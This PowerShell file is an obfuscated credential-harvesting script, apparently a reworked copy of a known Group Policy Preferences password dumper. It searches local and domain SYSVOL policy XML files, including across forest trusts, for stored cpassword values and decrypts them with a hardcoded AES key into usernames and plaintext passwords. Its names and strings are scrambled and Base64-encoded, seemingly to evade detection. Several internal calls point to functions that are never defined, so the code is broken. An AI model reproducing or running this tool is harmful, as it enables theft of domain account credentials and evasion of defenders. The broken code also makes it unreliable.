function passwordgp {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSAvoidUsingWMICmdlet', '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSAvoidUsingPlainTextForPassword', '')]
    [CmdletBinding()]
    Param (
        [ValidateNotNullOrEmpty()]
        [String]
        $Server = $Env:USERDNSDOMAIN,

        [Switch]
        $SearchForest
    )

    
    function decryptpass {
        [CmdletBinding()]
        Param (
            [string] $Cpassword
        )

        try {
            
            ${__/=\__/=\/\__/==} = ($Cpassword.length % 4)

            switch (${__/=\__/=\/\__/==}) {
                '1' {$Cpassword = $Cpassword.Substring(0,$Cpassword.Length -1)}
                '2' {$Cpassword += ('=' * (4 - ${__/=\__/=\/\__/==}))}
                '3' {$Cpassword += ('=' * (4 - ${__/=\__/=\/\__/==}))}
            }

            ${/===\/==\/==\__/\} = [Convert]::FromBase64String($Cpassword)
            
            
            [System.Reflection.Assembly]::LoadWithPartialName($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwB5AHMAdABlAG0ALgBDAG8AcgBlAA==')))) |Out-Null

            
            ${/=\/==\/\___/=\/=} = New-Object System.Security.Cryptography.AesCryptoServiceProvider
            [Byte[]] ${/===\___/===\_/=\} = @(0x4e,0x99,0x06,0xe8,0xfc,0xb6,0x6c,0xc9,0xfa,0xf4,0x93,0x10,0x62,0x0f,0xfe,0xe8,
                                 0xf4,0x96,0xe8,0x06,0xcc,0x05,0x79,0x90,0x20,0x9b,0x09,0xa4,0x33,0xb6,0x6c,0x1b)

            
            ${_/=\_/\_/\____/=\} = New-Object Byte[](${/=\/==\/\___/=\/=}.IV.Length)
            ${/=\/==\/\___/=\/=}.IV = ${_/=\_/\_/\____/=\}
            ${/=\/==\/\___/=\/=}.Key = ${/===\___/===\_/=\}
            ${__/===\_____/\/\/} = ${/=\/==\/\___/=\/=}.CreateDecryptor()
            [Byte[]] ${________/===\__/\} = ${__/===\_____/\/\/}.TransformFinalBlock(${/===\/==\/==\__/\}, 0, ${/===\/==\/==\__/\}.length)

            return [System.Text.UnicodeEncoding]::Unicode.GetString(${________/===\__/\})
        }

        catch { Write-Error $Error[0] }
    }

    
    function gpinfield {
    [CmdletBinding()]
        Param (
            $File
        )

        try {
            ${/=\/==\/=\_/\_/=\} = Split-Path $File -Leaf
            [xml] ${_____/===\/\/===\} = gc ($File)

            
            if (${_____/===\/\/===\}.innerxml -match $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('YwBwAGEAcwBzAHcAbwByAGQA')))) {

                ${_____/===\/\/===\}.GetElementsByTagName($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAByAG8AcABlAHIAdABpAGUAcwA=')))) | % {
                    if ($_.cpassword) {
                        $Cpassword = $_.cpassword
                        if ($Cpassword -and ($Cpassword -ne '')) {
                           ${__/==\/\_/\_/====} = _/=\/\/\/\/====\/\ $Cpassword
                           ${_____/=\/\/===\/\} = ${__/==\/\_/\_/====}
                           Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBHAGUAdAAtAEcAUABQAEkAbgBuAGUAcgBGAGkAZQBsAGQAXQAgAEQAZQBjAHIAeQBwAHQAZQBkACAAcABhAHMAcwB3AG8AcgBkACAAaQBuACAAJwAkAEYAaQBsAGUAJwA=')))
                        }

                        if ($_.newName) {
                            ${/=\/==\/====\/=\/} = $_.newName
                        }

                        if ($_.userName) {
                            ${_/\/=\/==\____/=\} = $_.userName
                        }
                        elseif ($_.accountName) {
                            ${_/\/=\/==\____/=\} = $_.accountName
                        }
                        elseif ($_.runAs) {
                            ${_/\/=\/==\____/=\} = $_.runAs
                        }

                        try {
                            ${/==\/=\/===\/==\/} = $_.ParentNode.changed
                        }
                        catch {
                            Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBHAGUAdAAtAEcAUABQAEkAbgBuAGUAcgBGAGkAZQBsAGQAXQAgAFUAbgBhAGIAbABlACAAdABvACAAcgBlAHQAcgBpAGUAdgBlACAAUABhAHIAZQBuAHQATgBvAGQAZQAuAGMAaABhAG4AZwBlAGQAIABmAG8AcgAgACcAJABGAGkAbABlACcA')))
                        }

                        try {
                            ${__/==\/=\_/\_/\__} = $_.ParentNode.ParentNode.LocalName
                        }
                        catch {
                            Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBHAGUAdAAtAEcAUABQAEkAbgBuAGUAcgBGAGkAZQBsAGQAXQAgAFUAbgBhAGIAbABlACAAdABvACAAcgBlAHQAcgBpAGUAdgBlACAAUABhAHIAZQBuAHQATgBvAGQAZQAuAFAAYQByAGUAbgB0AE4AbwBkAGUALgBMAG8AYwBhAGwATgBhAG0AZQAgAGYAbwByACAAJwAkAEYAaQBsAGUAJwA=')))
                        }

                        if (!(${_____/=\/\/===\/\})) {${_____/=\/\/===\/\} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBCAEwAQQBOAEsAXQA=')))}
                        if (!(${_/\/=\/==\____/=\})) {${_/\/=\/==\____/=\} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBCAEwAQQBOAEsAXQA=')))}
                        if (!(${/==\/=\/===\/==\/})) {${/==\/=\/===\/==\/} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBCAEwAQQBOAEsAXQA=')))}
                        if (!(${/=\/==\/====\/=\/})) {${/=\/==\/====\/=\/} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBCAEwAQQBOAEsAXQA=')))}

                        ${__/\/====\/===\/\} = New-Object PSObject
                        ${__/\/====\/===\/\} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBzAGUAcgBOAGEAbQBlAA=='))) ${_/\/=\/==\____/=\}
                        ${__/\/====\/===\/\} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBlAHcATgBhAG0AZQA='))) ${/=\/==\/====\/=\/}
                        ${__/\/====\/===\/\} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABhAHMAcwB3AG8AcgBkAA=='))) ${_____/=\/\/===\/\}
                        ${__/\/====\/===\/\} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBoAGEAbgBnAGUAZAA='))) ${/==\/=\/===\/==\/}
                        ${__/\/====\/===\/\} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBpAGwAZQA='))) $File
                        ${__/\/====\/===\/\} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBvAGQAZQBOAGEAbQBlAA=='))) ${__/==\/=\_/\_/\__}
                        ${__/\/====\/===\/\} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBwAGEAcwBzAHcAbwByAGQA'))) $Cpassword
                        ${__/\/====\/===\/\}
                    }
                }
            }
        }
        catch {
            Write-Warning $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBHAGUAdAAtAEcAUABQAEkAbgBuAGUAcgBGAGkAZQBsAGQAXQAgAEUAcgByAG8AcgAgAHAAYQByAHMAaQBuAGcAIABmAGkAbABlACAAJwAkAEYAaQBsAGUAJwAgADoAIAAkAF8A')))
        }
    }

    
    function domaintrust {
        [CmdletBinding()]
        Param (
            $Domain
        )

        if (Test-Connection -Count 1 -Quiet -ComputerName $Domain) {
            try {
                ${__/\/=\/==\/=\_/=} = New-Object System.DirectoryServices.ActiveDirectory.DirectoryContext($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A'))), $Domain)
                ${/=====\/\__/=\___} = [System.DirectoryServices.ActiveDirectory.Domain]::GetDomain(${__/\/=\/==\/=\_/=})
                if (${/=====\/\__/=\___}) {
                    ${/=====\/\__/=\___}.GetAllTrustRelationships() | select -ExpandProperty TargetName
                }
            }
            catch {
                Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBHAGUAdAAtAEQAbwBtAGEAaQBuAFQAcgB1AHMAdABdACAARQByAHIAbwByACAAYwBvAG4AdABhAGMAdABpAG4AZwAgAGQAbwBtAGEAaQBuACAAJwAkAEQAbwBtAGEAaQBuACcAIAA6ACAAJABfAA==')))
            }

            try {
                ${/====\/\/\/=\/==\} = New-Object System.DirectoryServices.ActiveDirectory.DirectoryContext($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBvAHIAZQBzAHQA'))), $Domain)
                ${______/=\/\/=\_/=} = [System.DirectoryServices.ActiveDirectory.Forest]::GetForest(${/====\/\/\/=\/==\})
                if (${______/=\/\/=\_/=}) {
                    ${______/=\/\/=\_/=}.GetAllTrustRelationships() | select -ExpandProperty TargetName
                }
            }
            catch {
                Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBHAGUAdAAtAEQAbwBtAGEAaQBuAFQAcgB1AHMAdABdACAARQByAHIAbwByACAAYwBvAG4AdABhAGMAdABpAG4AZwAgAGYAbwByAGUAcwB0ACAAJwAkAEQAbwBtAGEAaQBuACcAIAAoAGQAbwBtAGEAaQBuACAAbQBhAHkAIABuAG8AdAAgAGIAZQAgAGEAIABmAG8AcgBlAHMAdAAgAG8AYgBqAGUAYwB0ACkAIAA6ACAAJABfAA==')))
            }
        }
    }

    
    function domainmapping {
        [CmdletBinding()]
        Param ()

        
        ${_/==\/\_/==\_/\/\} = @{}

        
        ${__/=\/==\/\/=\/==} = New-Object System.Collections.Stack

        try {
            ${_/\/\/\/=\/=\_/=\} = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain() | select -ExpandProperty Name
            ${_/\/\/\/=\/=\_/=\}
        }
        catch {
            Write-Warning $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBHAGUAdAAtAEQAbwBtAGEAaQBuAFQAcgB1AHMAdABNAGEAcABwAGkAbgBnAF0AIABFAHIAcgBvAHIAIABlAG4AdQBtAGUAcgBhAHQAaQBuAGcAIABjAHUAcgByAGUAbgB0ACAAZABvAG0AYQBpAG4AOgAgACQAXwA=')))
        }

        if (${_/\/\/\/=\/=\_/=\} -and ${_/\/\/\/=\/=\_/=\} -ne '') {
            ${__/=\/==\/\/=\/==}.Push(${_/\/\/\/=\/=\_/=\})

            while(${__/=\/==\/\/=\/==}.Count -ne 0) {

                $Domain = ${__/=\/==\/\/=\/==}.Pop()

                
                if ($Domain -and ($Domain.Trim() -ne '') -and (-not ${_/==\/\_/==\_/\/\}.ContainsKey($Domain))) {

                    Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBHAGUAdAAtAEQAbwBtAGEAaQBuAFQAcgB1AHMAdABNAGEAcABwAGkAbgBnAF0AIABFAG4AdQBtAGUAcgBhAHQAaQBuAGcAIAB0AHIAdQBzAHQAcwAgAGYAbwByACAAZABvAG0AYQBpAG4AOgAgACcAJABEAG8AbQBhAGkAbgAnAA==')))

                    
                    $Null = ${_/==\/\_/==\_/\/\}.Add($Domain, '')

                    try {
                        
                        _/==\__/======\/\_ -Domain $Domain | sort -Unique | % {
                            
                            if (-not ${_/==\/\_/==\_/\/\}.ContainsKey($_) -and (Test-Connection -Count 1 -Quiet -ComputerName $_)) {
                                $Null = ${__/=\/==\/\/=\/==}.Push($_)
                                $_
                            }
                        }
                    }
                    catch {
                        Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBHAGUAdAAtAEQAbwBtAGEAaQBuAFQAcgB1AHMAdABNAGEAcABwAGkAbgBnAF0AIABFAHIAcgBvAHIAOgAgACQAXwA=')))
                    }
                }
            }
        }
    }

    try {
        ${/=\/====\/\/=====} = @()
        ${__/=\/==\/\/=\/==} = @()

        ${_/\/\/\/\___/==\/} = $Env:ALLUSERSPROFILE
        if (-not ${_/\/\/\/\___/==\/}) {
            ${_/\/\/\/\___/==\/} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwA6AFwAUAByAG8AZwByAGEAbQBEAGEAdABhAA==')))
        }

        
        Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBHAGUAdAAtAEcAUABQAFAAYQBzAHMAdwBvAHIAZABdACAAUwBlAGEAcgBjAGgAaQBuAGcAIABsAG8AYwBhAGwAIABoAG8AcwB0ACAAZgBvAHIAIABhAG4AeQAgAGMAYQBjAGgAZQBkACAARwBQAFAAIABmAGkAbABlAHMA')))
        ${/=\/====\/\/=====} += ls -Path ${_/\/\/\/\___/==\/} -Recurse -Include $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwByAG8AdQBwAHMALgB4AG0AbAA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBpAGMAZQBzAC4AeABtAGwA'))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBjAGgAZQBkAHUAbABlAGQAdABhAHMAawBzAC4AeABtAGwA'))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABhAHQAYQBTAG8AdQByAGMAZQBzAC4AeABtAGwA'))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAByAGkAbgB0AGUAcgBzAC4AeABtAGwA'))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RAByAGkAdgBlAHMALgB4AG0AbAA='))) -Force -ErrorAction SilentlyContinue

        if ($SearchForest) {
            Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBHAGUAdAAtAEcAUABQAFAAYQBzAHMAdwBvAHIAZABdACAAUwBlAGEAcgBjAGgAaQBuAGcAIABmAG8AcgAgAGEAbABsACAAcgBlAGEAYwBoAGEAYgBsAGUAIAB0AHIAdQBzAHQAcwA=')))
            ${__/=\/==\/\/=\/==} += _/==\/\/\/=\/\____
        }
        else {
            if ($Server) {
                ${__/=\/==\/\/=\/==} += , $Server
            }
            else {
                
                ${__/=\/==\/\/=\/==} += , [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain() | select -ExpandProperty Name
            }
        }

        ${__/=\/==\/\/=\/==} = ${__/=\/==\/\/=\/==} | ? {$_} | sort -Unique

        ForEach ($Domain in ${__/=\/==\/\/=\/==}) {
            
            Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBHAGUAdAAtAEcAUABQAFAAYQBzAHMAdwBvAHIAZABdACAAUwBlAGEAcgBjAGgAaQBuAGcAIABcAFwAJABEAG8AbQBhAGkAbgBcAFMAWQBTAFYATwBMAFwAKgBcAFAAbwBsAGkAYwBpAGUAcwAuACAAVABoAGkAcwAgAGMAbwB1AGwAZAAgAHQAYQBrAGUAIABhACAAdwBoAGkAbABlAC4A')))
            ${/==\/====\/\/\/==} = ls -Force -Path $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XABcACQARABvAG0AYQBpAG4AXABTAFkAUwBWAE8ATABcACoAXABQAG8AbABpAGMAaQBlAHMA'))) -Recurse -ErrorAction SilentlyContinue -Include @($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwByAG8AdQBwAHMALgB4AG0AbAA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBpAGMAZQBzAC4AeABtAGwA'))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBjAGgAZQBkAHUAbABlAGQAdABhAHMAawBzAC4AeABtAGwA'))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABhAHQAYQBTAG8AdQByAGMAZQBzAC4AeABtAGwA'))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAByAGkAbgB0AGUAcgBzAC4AeABtAGwA'))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RAByAGkAdgBlAHMALgB4AG0AbAA='))))

            if(${/==\/====\/\/\/==}) {
                ${/=\/====\/\/=====} += ${/==\/====\/\/\/==}
            }
        }

        if ( -not ${/=\/====\/\/=====} ) { throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBHAGUAdAAtAEcAUABQAFAAYQBzAHMAdwBvAHIAZABdACAATgBvACAAcAByAGUAZgBlAHIAZQBuAGMAZQAgAGYAaQBsAGUAcwAgAGYAbwB1AG4AZAAuAA=='))) }

        Write-Verbose "[Get-GPPPassword] Found $(${/=\/====\/\/=====} | measure | select -ExpandProperty Count) files that could contain passwords."

        ForEach ($File in ${/=\/====\/\/=====}) {
            ${_/=\/\/\____/\/\/} = (_/=====\/=\/\__/=\ $File.Fullname)
            ${_/=\/\/\____/\/\/}
        }
    }

    catch { Write-Error $Error[0] }
}
